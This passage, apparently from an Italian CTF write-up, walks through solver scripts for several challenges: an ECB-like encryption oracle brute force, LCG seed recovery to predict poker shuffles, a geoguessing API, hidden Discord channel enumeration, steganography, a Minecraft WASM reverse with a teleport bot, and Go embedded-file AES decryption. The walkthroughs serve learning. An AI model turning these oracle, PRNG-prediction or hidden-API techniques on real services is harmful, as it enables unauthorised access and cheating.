CHARSET = string.ascii_uppercase + string.digits + '{}_'
FIELD_NAME = 'text'

session = requests.Session()
session.headers.update({'User-Agent': 'simple-encoder-solver/1.0'})


def parse_tokens(html: str) -> List[str]:
    soup = bs4.BeautifulSoup(html, 'html.parser')
    div = soup.find('div', class_='encoded')
    if not div:
        return []
    return [el.get_text(strip=True) for el in div.find_all() if el.get_text(strip=True)]


def get_flag_tokens() -> List[str]:
    r = session.get(BASE_URL + '/flag', timeout=15)
    r.raise_for_status()
    return parse_tokens(r.text)


def encode(text: str) -> List[str]:
    r = session.post(BASE_URL + '/encode', data={FIELD_NAME: text}, timeout=15)
    r.raise_for_status()
    return parse_tokens(r.text)


def solve() -> str:
    flag_tokens = get_flag_tokens()
    if not flag_tokens:
        raise RuntimeError('No tokens returned from /flag')
    needed = set(flag_tokens)
    mapping: Dict[str, str] = {}

    for _ in range(ROUNDS):
        chars = list(CHARSET)
        random.shuffle(chars)
        for ch in chars:
            try:
                tokens = encode(ch * REPEATS)
            except Exception:
                continue
            for t in tokens:
                if t in needed and t not in mapping:
                    mapping[t] = ch
            if SLEEP:
                time.sleep(SLEEP)
        if len(mapping) == len(needed):
            break

    decoded = ''.join(mapping.get(t, '?') for t in flag_tokens)
    print(f"Mapped {len(mapping)}/{len(needed)} tokens")
    return decoded


if __name__ == '__main__':
    print(solve())

```

### Rule of X

#### Analisi

Il servizio permette due cose:

* Cifrare una storia che contiene la flag
* Cifrare un plaintext a scelta

```
Welcome to The Dream of Poliphilus!
1. Get a story and a flag
2. Encrypt plaintext
>
```

Cifrando alcuni plaintext, ho trovato che un blocco da 4 byte mappa sempre in un altro blocco da 4 byte (tipo ECB).

```
> aaaa1
Ciphertext:
46d08e66 948d0fbf

> aaaa
Ciphertext:
46d08e66 31a3a187

> 1
Ciphertext:
948d0fbf
```

#### Soluzione

Dato che un blocco da 4 byte mappa sempre in un altro blocco da 4 byte, per decifrare l’intero testo dovremmo inviare ogni possibile combinazione di 4 caratteri da cifrare... o no?

In realtà, non ci interessa l’intero testo: ci serve solo la flag. Conoscendo il formato (CTF{valoriesa}), possiamo restringere l’alfabeto da cifrare.

Arriviamo quindi a questa soluzione:

```python
from itertools import product
from pwn import *
from tqdm import trange
context.log_level = 'critical'

alphabet = 'CTF{}' + '0123456789abcdef'

combs = product(alphabet, repeat=4)

payload = ''.join([''.join(c) for c in combs])

output = ''
blocks = [payload[i:i+4] for i in range(0, len(payload), 4)]
for i in trange(0, len(blocks), 100):
    r = remote('28267ab8.ctf.ac.upt.ro', 9323)
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ',''.join(blocks[i:i+100]).encode())
    r.recvline()
    output += r.recvline().strip().decode()[:-8]
    r.close()

mappings = {}

assert len(output) % 8 == 0, "Encrypted output length should be a multiple of 8"
for i in range(0, len(output), 8):
    enc_chunk = output[i:i+8]            # 8-byte ciphertext block
    plain_idx = i // 2                   # maps to corresponding 4-byte plaintext start
    plain_chunk = payload[plain_idx:plain_idx+4]
    mappings[enc_chunk] = plain_chunk
   
r.close()

r = remote('28267ab8.ctf.ac.upt.ro', 9323)
r.sendlineafter(b'> ', b'1')
r.recvline()
flag_enc = r.recvline().strip().decode()
r.close()

assert len(flag_enc) % 8 == 0, "Encrypted flag length should be a multiple of 8"
decoded_blocks = []
for i in range(0, len(flag_enc), 8):
    c = flag_enc[i:i+8]
    decoded_blocks.append(mappings.get(c, '????'))

flag_dec = ''.join(decoded_blocks)
print(f'Flag: {flag_dec}')
```

Ma c’è un problema: questo codice non riesce a estrarre l’intera flag. L’output è:

```
????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????F{0b3d4dd2dfa538c778f815b824da290e60ebc6d6116fcb94acc76a232fe811????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
```

Si nota l’inizio ‘F{...’ e possiamo premettere ‘CT’, ma come ottenere l’ultimo blocco?

Consideriamo cosa contiene l’ultimo blocco: 4 caratteri, i primi due sono cifre esadecimali, poi una parentesi graffa di chiusura e un carattere casuale (ecco perché il primo script non poteva decodificare tutto).

Sulla base di questo, possiamo forzare i due caratteri esadecimali e l’ultimo carattere, estraendo così il blocco finale della flag.

```python
for tup in trange(255):
    for i in trange(255):
        if not chr(i).isprintable(): continue
        brute = f"{tup:02x}" + "}" + chr(i)
        r = remote('28267ab8.ctf.ac.upt.ro', 9323)
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'> ', brute.encode())
        r.recvline()
        output = r.recvline().strip().decode()
        r.close()
        if output[:8] in flag_enc:
            print(f"Found matching plaintext: {brute}")
            exit(0)
        else:
            if tup == 0:
                print(output[:8])
else:
    print("No matching 4-byte plaintext found in given alphabet.")
```

Che produce -> **`e7}H`**

#### Script

```python
from itertools import product
from pwn import *
from tqdm import trange
context.log_level = 'critical'

alphabet = 'CTF{}' + '0123456789abcdef'

combs = product(alphabet, repeat=4)

payload = ''.join([''.join(c) for c in combs])

output = ''
blocks = [payload[i:i+4] for i in range(0, len(payload), 4)]
for i in trange(0, len(blocks), 100):
    r = remote('28267ab8.ctf.ac.upt.ro', 9323)
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ',''.join(blocks[i:i+100]).encode())
    r.recvline()
    output += r.recvline().strip().decode()[:-8]
    r.close()

mappings = {}

assert len(output) % 8 == 0, "Encrypted output length should be a multiple of 8"
for i in range(0, len(output), 8):
    enc_chunk = output[i:i+8]            # 8-byte ciphertext block
    plain_idx = i // 2                   # maps to corresponding 4-byte plaintext start
    plain_chunk = payload[plain_idx:plain_idx+4]
    mappings[enc_chunk] = plain_chunk
   
r.close()

r = remote('28267ab8.ctf.ac.upt.ro', 9323)
r.sendlineafter(b'> ', b'1')
r.recvline()
flag_enc = r.recvline().strip().decode()
r.close()

assert len(flag_enc) % 8 == 0, "Encrypted flag length should be a multiple of 8"
decoded_blocks = []
for i in range(0, len(flag_enc), 8):
    c = flag_enc[i:i+8]
    decoded_blocks.append(mappings.get(c, '????'))

flag_dec = ''.join(decoded_blocks)
print(f'Flag: {flag_dec}')
with open('flag.txt', 'w') as f:
    f.write(flag_dec + '\n')

for tup in trange(255):
    for i in trange(255):
        if not chr(i).isprintable(): continue
        brute = f"{tup:02x}" + "}" + chr(i)
        r = remote('28267ab8.ctf.ac.upt.ro', 9323)
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'> ', brute.encode())
        r.recvline()
        output = r.recvline().strip().decode()
        r.close()
        if output[:8] in flag_enc:
            print(f"Found matching plaintext: {brute}")
            exit(0)
        else:
            if tup == 0:
                print(output[:8])
else:
    print("No matching 4-byte plaintext found in given alphabet.")
```

## Varie 🐧

### Full-House Poker

#### Analisi

Il gioco di poker remoto mescolava il mazzo usando un generatore lineare congruenziale (LCG) non crittografico con seed a 24 bit e Fisher–Yates. Foldando per alcune mani per raccogliere mani consecutive del giocatore, possiamo recuperare il seed (con una piccola finestra temporale o brute-force 2^24), riprodurre le mescolate future e puntare solo quando la mano prevista batte strettamente quella del dealer. Vincendo 30 volte si ottiene la flag.

* PRNG: LCG con parametri A=1103515245, C=12345, M=2^31, seed troncato a 24 bit.
* Shuffle: Fisher-Yates, avanzando il PRNG una volta per swap (51 estrazioni per round).
* Osservazione: Il giocatore riceve le prime 5 carte del mazzo mescolato; il dealer le successive 5.
* Attacco: Raccogliere 4 mani consecutive foldando; recuperare il seed; predire i round futuri; puntare solo su vittorie garantite; raggiungere una serie di 30.

#### Soluzione

1. Raccolta dati --> fold:

* Leggere le carte ASCII per 4 round consecutivi (`HAND_SAMPLES = 4`).
* Inviare sempre `f` (fold) in questa fase. Conserva la serie e garantisce una mescolata per round senza uso extra del PRNG.

2. Recupero seed:

* Ricerca a finestra temporale: il seed è derivato da `time.time()` modulo 2^24, assumo il timestamp vicino al momento di connessione. Partire da `now & 0xFFFFFF` e provare raggi di 10m, 1h, 6h, 24h (~600, ~3600, ~21600, ~86400 secondi). Per ogni seed candidato, simulare `HAND_SAMPLES` mescolate e verificare che le prime 5 carte corrispondano alle mani osservate.
* Brute force completa: se fallisce, scandire tutto lo spazio a 24 bit (~16,7M seed). Fattibile in Python efficiente con early-reject.

3. Predizione e vittoria:

* Dopo il recupero del seed, avanzare il PRNG eseguendo `HAND_SAMPLES` mescolate per sincronizzarsi col round successivo.
* Per ogni round:

  * Simulare la prossima mescolata ed estrarre le 5 carte del giocatore e del dealer (posizioni 0..4 e 5..9 del mazzo).
  * Valutare entrambe le mani con lo stesso ranking del server e confrontare.
  * Puntare solo se la mano del giocatore batte strettamente quella del dealer; altrimenti foldare.
* Ripetere finché la serie arriva a 30; il server stampa la flag.

#### Script

```python
from pwn import remote, context
import re
import sys
import time

context.log_level = 'info'

HOST = '?'
PORT = ?
MAX_SEED = 0xFFFFFF  # 24-bit
HAND_SAMPLES = 4      # number of initial hands to collect for seed filtering

RANK_ORDER = ['2','3','4','5','6','7','8','9','T','J','Q','K','A']
SUITS = ['♠','♥','♦','♣']
RANK_VALUE = {r: i+2 for i, r in enumerate(RANK_ORDER)}

# Build canonical ordered deck
def build_deck():
    return [(r,s) for r in RANK_ORDER for s in SUITS]

# LCG parameters (mod 2^31)
A = 1103515245
C = 12345
M = 1 << 31

def lcg_next(state):
    return (A * state + C) & 0x7fffffff

# Apply Fisher-Yates using LCG state; returns new state after 51 draws and deck
def shuffle_with_state(state):
    deck = build_deck()
    for i in range(len(deck)-1, 0, -1):
        state = lcg_next(state)
        j = state % (i+1)
        deck[i], deck[j] = deck[j], deck[i]
    return state, deck

# Hand evaluation (same tuples ordering as server)
def hand_strength(cards):
    ranks = sorted([RANK_VALUE[r] for (r, s) in cards], reverse=True)
    suits = [s for (r,s) in cards]
    counts = {}
    for rv in ranks:
        counts[rv] = counts.get(rv,0)+1
    by_count_then_rank = sorted(counts.items(), key=lambda kv: (kv[1], kv[0]), reverse=True)
    is_flush = len(set(suits)) == 1
    sorted_unique_desc = sorted(set(ranks), reverse=True)
    is_straight = False
    straight_high = None
    if len(sorted_unique_desc) == 5:
        top = sorted_unique_desc[0]
        if sorted_unique_desc == list(range(top, top-5, -1)):
            is_straight = True
            straight_high = top
        else:
            wheel = [14,5,4,3,2]
            if sorted_unique_desc == wheel:
                is_straight = True
                straight_high = 5
    counts_sorted = [c for (_,c) in by_count_then_rank]
    ranks_sorted_by_count = [r for (r,_) in by_count_then_rank]
    if counts_sorted[0] == 4:
        return (7, ranks_sorted_by_count[0], ranks_sorted_by_count[1])
    if counts_sorted[0] == 3 and counts_sorted[1] == 2:
        return (6, ranks_sorted_by_count[0], ranks_sorted_by_count[1])
    if is_flush and is_straight:
        return (8, straight_high)
    if is_flush:
        return (5, sorted(ranks, reverse=True))
    if is_straight:
        return (4, straight_high)
    if counts_sorted[0] == 3:
        trips_rank = ranks_sorted_by_count[0]
        kickers = sorted([r for r in ranks if r != trips_rank], reverse=True)
        return (3, trips_rank, kickers)
    if counts_sorted[0] == 2 and counts_sorted[1] == 2:
        high_pair = max(ranks_sorted_by_count[0], ranks_sorted_by_count[1])
        low_pair = min(ranks_sorted_by_count[0], ranks_sorted_by_count[1])
        kicker = [r for r in ranks if r != high_pair and r != low_pair][0]
        return (2, high_pair, low_pair, kicker)
    if counts_sorted[0] == 2:
        pair_rank = ranks_sorted_by_count[0]
        kickers = sorted([r for r in ranks if r != pair_rank], reverse=True)
        return (1, pair_rank, kickers)
    return (0, sorted(ranks, reverse=True))

def compare_hands(p1, p2):
    s1 = hand_strength(p1)
    s2 = hand_strength(p2)
    return (s1 > s2) - (s1 < s2)

CARD_WIDTH = 7
CARD_LINES = 7

def parse_hand(block):
    lines = block.strip('\n').split('\n')
    # Expect 7 lines of cards
    if len(lines) < CARD_LINES:
        raise ValueError('Unexpected hand block lines')
    line1 = lines[1]  # second line (index 1)
    line3 = lines[3]  # fourth line (index 3)
    parts1 = line1.split(' ')  # cards separated by space
    parts3 = line3.split(' ')
    cards = []

    card_regex_rank = re.compile(r'│(.{1,2})\s{3}│')
    card_regex_suit = re.compile(r'│\s{2}(.)\s{2}│')
    ranks = card_regex_rank.findall(line1)
    suits = card_regex_suit.findall(line3)
    if len(ranks) != len(suits):
        raise ValueError('Rank/suit count mismatch')
    for r,s in zip(ranks,suits):
        cards.append((r.strip(), s))
    return cards

HAND_HEADER = 'Your hand:'

def recv_until_hand(io):
    data = b''
    while True:
        chunk = io.recvuntil(b'Action? [b]et / [f]old > ', timeout=5)
        data += chunk
        text = data.decode(errors='ignore')
        # Extract portion between 'Your hand:' and the prompt
        if HAND_HEADER in text:
            # Get last occurrence
            idx = text.rfind(HAND_HEADER)
            after = text[idx+len(HAND_HEADER):]
            top_idx = after.find('┌')
            if top_idx == -1:
                continue
            hand_block = after[top_idx:]
            if 'Action? [b]et / [f]old >' in hand_block:
                hand_block = hand_block.split('Action? [b]et / [f]old >')[0]
            # Keep exactly 7 lines
            lines = hand_block.split('\n')[:CARD_LINES]
            hand_ascii = '\n'.join(lines)
            try:
                return parse_hand(hand_ascii)
            except Exception as e:
                context.log_level='debug'
                print('Parse error, retry:', e)
                context.log_level='info'
        # else keep waiting


def recover_seed(hands):
    candidates = []
    for seed in range(MAX_SEED+1):
        state = seed & 0xffffffff
        ok = True
        for target in hands:
            state, deck = shuffle_with_state(state)
            if deck[:5] != target:
                ok = False
                break
        if ok:
            candidates.append(seed)
            if len(candidates) == 1:
                break  # assume unique
    return candidates[0] if candidates else None


def recover_seed_time_window(hands, center, radius):
    total = 2*radius + 1
    for off in range(-radius, radius+1):
        seed = (center + off) & 0xFFFFFF
        state = seed & 0xffffffff
        ok = True
        for target in hands:
            state, deck = shuffle_with_state(state)
            if deck[:5] != target:
                ok = False
                break
        if ok:
            return seed
    return None


def predict_next(state):
    state, deck = shuffle_with_state(state)
    player = deck[:5]
    dealer = deck[5:10]
    return state, player, dealer


def main():
    io = remote(HOST, PORT)

    collected = []
    for i in range(HAND_SAMPLES):
        hand = recv_until_hand(io)
        print(f'[+] Round {i} observed player hand: {hand}')
        collected.append(hand)
        io.sendline(b'f')  # fold to preserve streak

    now_seed = int(time.time()) & 0xFFFFFF
    windows = [600, 3600, 6*3600, 24*3600]  # 10m, 1h, 6h, 24h
    seed = None
    start = time.time()
    for rad in windows:
        print(f'[*] Trying seed window +/-{rad}s around 0x{now_seed:06x}...')
        seed = recover_seed_time_window(collected, now_seed, rad)
        if seed is not None:
            break
    if seed is None:
        print('[*] Falling back to full 2^24 brute force; this may take time')
        seed = recover_seed(collected)
    elapsed = time.time() - start

    if seed is None:
        print('[-] Seed not found')
        io.interactive()
        return
    print(f'[+] Seed recovered: 0x{seed:06x} in {elapsed:.2f}s')

    state = seed & 0xffffffff
    for _ in range(HAND_SAMPLES):
        state, _deck = shuffle_with_state(state)

    streak = 0
    target_streak = 30
    round_idx = HAND_SAMPLES

    while streak < target_streak:
        state, predicted_player, predicted_dealer = predict_next(state)
        result = compare_hands(predicted_player, predicted_dealer)
        action = 'b' if result > 0 else 'f'
        print(f'[+] Predict round {round_idx}: player={predicted_player} dealer={predicted_dealer} -> result={result} action={action}')

        # Receive actual round hand
        actual = recv_until_hand(io)
        if actual != predicted_player:
            print('[-] Mismatch in prediction, abort.')
            io.interactive()
            return
        io.sendline(action.encode())

        if action == 'b':
            streak += 1
        print(f'[+] Current streak: {streak}')
        round_idx += 1

    io.interactive()

if __name__ == '__main__':
    main()

```

### Grass-Guesser

#### Analisi

La challenge era un simpatico gioco in stile "geoguesser" in cui, da una semplice immagine d’erba, bisognava trovare dove si trovasse quell’erba nel mondo.
Sarebbe impossibile, se non fosse che il sito, ogni volta che sbagliavi, ti diceva a che distanza eri dal punto reale e aggiungeva il nome della città o del parco coinvolto.

##### Trovare le coordinate

Era possibile (come ho fatto) cercare le coordinate approssimative del luogo indicato dal sito e poi aggiustarle in modo che il sito le accettasse.

#### Soluzione

La soluzione è semplice come sembra; la vera difficoltà era trovare ogni singola coordinata, cosa che si potrebbe probabilmente automatizzare, ma ho preferito farla a mano.

Dopo aver ottenuto tutte le coordinate, le ho inviate una per una al server ottenendo la flag
`CTF{53575e231bf06ed00182dcc71ef0e5d1b7d6da577d04ea08add31d8fbfd53722}`

#### Script

Questo è lo script effettivo usato per recuperare la flag dal remoto

```python
import requests, json

url = '?'

s = requests.Session()

r = s.post(url+'api/start')

sessId = json.loads(r.text)['sessionId']

lats = [51.5074,48.8566,40.7829,-33.8688,35.6762,52.5200,41.8902,37.7750,55.7558,1.2897]
longs = [-0.1278,2.3521,-73.9654,151.2093,139.6503,13.4051,12.4923,-122.4194,37.6173,103.8501]

for i in range(10):
    r = s.post(url+'api/guess', json={'sessionId': sessId, 'lat': lats[i%len(lats)], 'lng': longs[i%len(longs)]})
    
print(json.loads(r.text)['flag'])
```

### Discord Sanity Check

#### Analisi

La challenge non forniva alcun allegato e il solo indizio era la descrizione:

`Hope you liked our original discord challenge. Now we have a better one :D`

Ovviamente l’unico server Discord da analizzare era quello del CTF, con guild id `1358683641097621596`.

Fatto ciò, il flusso per trovare la flag è stato semplice e ha seguito questi passi:

* Aprire Discord nel browser ed entrare nel server giusto
* Modificare con burp / gestione rete di Firefox una richiesta API.

Dopodiché ho potuto analizzare il server, ipotizzando che non fosse necessaria alcuna interazione per trovare la flag.
Ho quindi aperto le [`API reference di Discord`](https://discord.com/developers/docs/resources/guild) e iniziato ad analizzare la guild.

* Richiesta API a `https://discord.com/api/v9/guilds/1358683641097621596`, qui niente di interessante a parte alcuni ruoli insoliti.
* Richiesta API per vedere tutti i canali (alcuni potrebbero essere nascosti ma condividere comunque informazioni; è così che funziona Discord secondo alcuni documenti online) `https://discord.com/api/v9/guilds/1358683641097621596/channels`

Usando l’ultima richiesta sono riuscito a trovare la flag nascosta nel topic di un canale privato ![screenshot della risposta API](/images/discord_sanity.png)

### Stairway To Heaven

#### Analisi

La challenge diceva esplicitamente che una scala del luogo aveva un "pezzo di stoffa" attaccato; abbiamo girato un minuto e subito dopo abbiamo trovato la flag.

![foto della scala](/images/staircases.png)

### Love at first bit

#### Analisi

A parte un lungo racconto, la challenge chiedeva di trovare dove fosse stata scattata questa foto:

![Allegato della challenge](/images/idk_what_this_is.png)

Domanda strana per una misc, soprattutto perché la descrizione non forniva dati utili a trovare la posizione.

Abbiamo quindi trattato l’immagine come una challenge di steganografia e l’abbiamo analizzata con [`aperisolve`](https://www.aperisolve.com/).

Abbiamo trovato la flag nell’analisi zsteg come `b1,rgb,lsb,xy`.

![screenshot di aperisolve](/images/aperisolve.png)

Con questo, abbiamo risolto la challenge e ottenuto la flag `CTF{Palazzo Falson}`.

## Reverse engineering ⚙️

### Minecrafty as a Service

#### Analisi

L’allegato `main.wasm` è un server Minecraft compilato in WebAssembly (WASM). Entrati nel server, si vedono due comandi disponibili: `!help` e `!flag`. Eseguendo `!flag`, il server risponde con qualcosa tipo: `Per ottenere la flag, esegui questo comando alla posizione UwU`. Questo implica che dobbiamo trovare l’esatta posizione alla quale eseguire `!flag`, come definita in `main.wasm`.

Per localizzare l’handler del comando, ho cercato una funzione con `chat` nel nome. Ho trovato `github.com_go_mc_server_game.__globalChat_.Handle`, che all’indirizzo 0x808c1d77 contiene l’handler per `!flag`. Analizzandolo, si vede che la posizione corrente del giocatore deve essere esattamente (35246, 35246, 35246) perché la flag venga stampata.

```c
// After matching "!flag"
int X = (int) truncS(player.posX);
int Y = (int) truncS(player.posY);
int Z = (int) truncS(player.posZ);

// 0x89ae == 35246
if (X != 0x89ae) goto fail;
if (Y != 0x89ae) goto fail;
if (Z == 0x89ae) goto success;   // all three must be 35246
else goto fail;
```

#### Soluzione

Sapendolo, dobbiamo spostarci alle coordinate (35246, 35246, 35246). Per farlo ho riutilizzato la soluzione della challenge Minecraft delle qualifiche, cambiando la posizione target.

#### Script

```js
#!/usr/bin/env node
const mineflayer = require('mineflayer')
const { Vec3 } = require('vec3')

function parseArgs () {
  const args = { host: '127.0.0.1', port: 25565, name: 'Flaggy', version: '1.19.4' }
  for (let i = 2; i < process.argv.length; i++) {
    const a = process.argv[i]
    if (a === '--host') args.host = process.argv[++i]
    else if (a === '--port') args.port = parseInt(process.argv[++i], 10)
    else if (a === '--name') args.name = process.argv[++i]
    else if (a === '--version') args.version = process.argv[++i]
  }
  return args
}

const TARGET = new Vec3(35246, 35246, 35246)
const MAX_STEP = 50

function stepTowards (cur, dst, maxStep) {
  const dx = dst.x - cur.x
  const dy = dst.y - cur.y
  const dz = dst.z - cur.z
  const dist = Math.sqrt(dx * dx + dy * dy + dz * dz)
  if (dist === 0) return cur
  if (dist <= maxStep) return new Vec3(dst.x, dst.y, dst.z)
  const s = maxStep / dist
  return new Vec3(cur.x + dx * s, cur.y + dy * s, cur.z + dz * s)
}

async function main () {
  const { host, port, name, version } = parseArgs()
  console.log('[INIT] Config:', { host, port, name, version })
  const createOpts = { host, port, username: name, auth: 'offline' }
  if (version && version.toLowerCase() !== 'auto') createOpts.version = version
  else console.log('[INIT] Version: auto')
  const bot = mineflayer.createBot(createOpts)

  bot.once('login', () => {
    console.log('[STATE] Logged in, waiting for spawn...')
  })
  bot.once('kicked', (reason) => {
    console.error('[STATE] Kicked:', reason?.toString?.() || reason)
  })
  bot.once('error', (err) => {
    console.error('[STATE] Error:', err)
  })
  bot.once('end', () => {
    console.log('[STATE] Disconnected')
  })

  bot.on('message', (cm) => {
    try {
      const s = cm.toString()
      console.log('[CHAT]', s)
      if (s.includes('ctf{')) {
        console.log(s)
        bot.end()
        process.exit(0)
      }
    } catch (_) {}
  })

  let movementStarted = false
  let movementState = null
  let teleportReady = true
  function startMovement (reason) {
    if (movementStarted) return
    movementStarted = true
    const start = bot.entity.position.clone()
    console.log(`[STATE] Starting movement (${reason}) at`, {
      x: start.x.toFixed(2), y: start.y.toFixed(2), z: start.z.toFixed(2)
    })

    if (bot.creative && bot.creative.startFlying) {
      try { bot.creative.startFlying(); console.log('[ACTION] Start flying') } catch (_) {}
    }

    let cur = start
    let moving = true
    let stepCount = 0
    const interval = 200
    const dist = (a, b) => Math.sqrt((a.x - b.x) ** 2 + (a.y - b.y) ** 2 + (a.z - b.z) ** 2)
    console.log('[MOVE] Target:', { x: TARGET.x, y: TARGET.y, z: TARGET.z })
    console.log('[MOVE] Initial distance:', dist(cur, TARGET).toFixed(2), 'blocks')

    movementState = { cur, moving, stepCount, interval }

    const timer = setInterval(() => {
      if (!movementState.moving) return
      const next = stepTowards(movementState.cur, TARGET, MAX_STEP)
      const stepLen = dist(movementState.cur, next)
      const remainBefore = dist(movementState.cur, TARGET)
      movementState.cur = next
      movementState.stepCount++
      console.log(`[MOVE] step ${movementState.stepCount} -> (${next.x.toFixed(2)}, ${next.y.toFixed(2)}, ${next.z.toFixed(2)}) ` +
                  `(step=${stepLen.toFixed(2)} rem=${Math.max(0, remainBefore - stepLen).toFixed(2)})`)
      try {
        bot._client.write('position', { x: next.x, y: next.y, z: next.z, onGround: true })
      } catch (e1) {
        try {
          bot._client.write('position_look', { x: next.x, y: next.y, z: next.z, yaw: 0, pitch: 0, onGround: true })
        } catch (e2) {
          console.error('[NET] Move send failed:', e2?.message || e2)
        }
      }

      if (next.equals(TARGET)) {
        movementState.moving = false
        clearInterval(timer)
        console.log('[MOVE] Arrived at target. Requesting flag...')
        setTimeout(() => {
          console.log('[CHAT] >> !flag')
          bot.chat('!flag')
        }, 500)
      }
    }, interval)
  }

  bot.once('spawn', () => startMovement('spawn'))

  bot.once('login', () => {
    setTimeout(() => {
      if (!movementStarted) {
        console.log('[WARN] Spawn not seen after 5s; starting anyway...')
        startMovement('timeout')
      }
    }, 5000)
  })

  let debugCount = 0
  bot._client.on('packet', (data, meta) => {
    if (debugCount < 10) {
      console.log('[PKT]', meta.name)
      debugCount++
    }
    if (meta.name === 'player_position_and_look' || meta.name === 'position' || meta.name === 'position_look' || meta.name === 'player_position') {
      const hasTeleportId = typeof data.teleportId === 'number'
      if (hasTeleportId) {
        try {
          bot._client.write('teleport_confirm', { teleportId: data.teleportId })
          console.log('[NET] Confirmed teleport id', data.teleportId)
        } catch (e) {
          console.log('[NET] Teleport confirm write failed:', e?.message || e)
        }
        teleportReady = true
      }
      const hasXYZ = typeof data.x === 'number' && typeof data.y === 'number' && typeof data.z === 'number'
      if (hasXYZ && movementState) {
        movementState.cur = new Vec3(data.x, data.y, data.z)
        console.log('[SYNC] Cur pos updated from server packet')
      }
      if (!movementStarted) startMovement('server-position')
    }
  })
}

main().catch((e) => {
  console.error(e)
  process.exit(1)
})
```

> N.B.: Questo exploit è praticamente lo stesso di [`Minecrafty originale`](https://pascalctf.github.io/en/ctf/ctfatac/#minecrafty)

### Volatile

#### Analisi

Analizzando il file ho capito che era un binario scritto in GO in cui la funzione `main.main` a `0x5309e0` costruiva un `afero.MemMapFs` sopra una tabella di file embedded e leggeva due path (`unk_5BCEE4` -> `e/f1`, `unk_5BCEE8` -> `e/f2`) tramite `github_com_spf13_afero_ReadFile`. La tabella stessa è una slice `[]internal/embed/file` a `0x604360`, il cui header (`ptr=0x604378, len=3`) punta a tre voci: directory `e/`, e file `e/f1` e `e/f2`. Ogni voce memorizza puntatore/lunghezza della stringa Go sia per il path sia per i dati del file, quindi dumpando le stringhe a quegli indirizzi si recuperano i payload. `e/f1` era la stringa ASCII di 32 byte `6b90408b52818c16e4e3fd2e8acb40d6`, mentre `e/f2` conteneva un ciphertext base64 da 128 byte che iniziava con `RLJwwmLd1PETlctb...PlPGI`.

Continuando nell’analisi di `main.main` ho capito che chiamava `encoding/base64.StdEncoding.DecodeString` su `e/f2`, prendeva i primi 16 byte decodificati come IV, e decrittava il resto con `crypto/aes.NewCipher` + `cipher.NewCBCDecrypter` usando i byte grezzi di `e/f1`. Il plaintext veniva poi scritto in `/uwu/flag.txt`, quindi ricreare quella routine offline riproduce la flag senza eseguire il binario target.

#### Soluzione

1. Ho usato `extract_embed_fs.py` per parsare la slice a `0x604360` e dumpare `extracted/e/f1` e `extracted/e/f2` direttamente da `.rodata`. Lo script converte gli indirizzi virtuali in offset di file usando la base di `.rodata` (`0x56b000`) osservata in IDA, quindi niente hex-editing manuale:

   ```bash
   cd Downloads
   python extract_embed_fs.py
   ```
2. Ho decrittato `e/f2` con il flusso AES-CBC rispecchiato da `main.main`. `decrypt_flag.py` decodifica in base64 il blob, separa IV+ciphertext, decritta, rimuove il padding PKCS#7, stampa il plaintext e lo scrive dove lo avrebbe messo il binario (`uwu/flag.txt`):

   ```bash
   python decrypt_flag.py
   ```

Così si ottiene la flag come avrebbe fatto il binario.

#### Script

##### Estrazione Embed FS

```python
#!/usr/bin/env python3

from __future__ import annotations

import argparse
import struct
from pathlib import Path


RODATA_VADDR = 0x56B000
RODATA_FOFFSET = 0x16B000
FILE_SLICE_ADDR = 0x604360
FILE_ENTRY_SIZE = 48  # sizeof(string) + sizeof(string) + 16-byte hash


def vaddr_to_offset(vaddr: int) -> int:
   if vaddr < RODATA_VADDR:
      raise ValueError(f"virtual address 0x{vaddr:x} is outside .rodata")
   return RODATA_FOFFSET + (vaddr - RODATA_VADDR)


def read_slice_header(blob: bytes) -> tuple[int, int, int]:
   if len(blob) != 24:
      raise ValueError("expected 24-byte slice header")
   return struct.unpack("<QQQ", blob)


def read_string(fh, ptr: int, length: int) -> str:
   fh.seek(vaddr_to_offset(ptr))
   return fh.read(length).decode("utf-8")


def read_bytes(fh, ptr: int, length: int) -> bytes:
   fh.seek(vaddr_to_offset(ptr))
   return fh.read(length)


def parse_entries(binary: Path) -> list[tuple[str, bytes]]:
   entries: list[tuple[str, bytes]] = []
   with binary.open("rb") as fh:
      fh.seek(vaddr_to_offset(FILE_SLICE_ADDR))
      ptr, length, capacity = read_slice_header(fh.read(24))
      if length != capacity:
         raise ValueError("embed.FS file table length mismatch")

      table_off = vaddr_to_offset(ptr)
      for idx in range(length):
         fh.seek(table_off + idx * FILE_ENTRY_SIZE)
         chunk = fh.read(FILE_ENTRY_SIZE)
         path_ptr, path_len = struct.unpack_from("<QQ", chunk, 0)
         data_ptr, data_len = struct.unpack_from("<QQ", chunk, 16)

         path = read_string(fh, path_ptr, path_len)
         data = b""
         if data_len:
            data = read_bytes(fh, data_ptr, data_len)
         entries.append((path, data))
   return entries


def main():
   parser = argparse.ArgumentParser(description=__doc__)
   parser.add_argument(
      "--binary",
      default="volatile",
      type=Path,
      help="path to the Go binary (default: ./volatile)",
   )
   parser.add_argument(
      "--outdir",
      default=Path("extracted"),
      type=Path,
      help="directory for extracted payloads (default: ./extracted)",
   )
   args = parser.parse_args()

   args.outdir.mkdir(parents=True, exist_ok=True)
   entries = parse_entries(args.binary)

   for path, data in entries:
      if not data:
         continue
      out_path = args.outdir / path
      out_path.parent.mkdir(parents=True, exist_ok=True)
      out_path.write_bytes(data)
      print(f"Wrote {len(data):4d} bytes -> {out_path}")


if __name__ == "__main__":
   main()
```

##### Decrittazione file

```python
#!/usr/bin/env python3

from __future__ import annotations

import argparse
import base64
from pathlib import Path

from Crypto.Cipher import AES


def read(path: Path) -> bytes:
   data = path.read_bytes()
   if not data:
      raise ValueError(f"{path} is empty")
   return data


def unpad(block: bytes) -> bytes:
   pad_len = block[-1]
   if pad_len == 0 or pad_len > len(block):
